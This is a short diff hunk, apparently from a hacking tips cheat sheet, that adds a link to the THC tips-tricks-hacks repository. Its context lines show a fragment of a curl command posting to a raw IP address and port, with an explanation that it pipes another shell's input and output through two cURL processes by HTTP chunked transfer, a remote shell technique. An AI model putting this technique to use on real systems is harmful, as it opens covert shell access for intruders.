@@ -75,3 +75,5 @@ exec curl -X POST -sN http://217.138.219.220:30903/input \
 
 This command starts two cURL processes and connects another shell's input and output these two cURL. HTTP's 'chunked transfer' (`-T`) does the rest.
 
+---
+More at https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet.
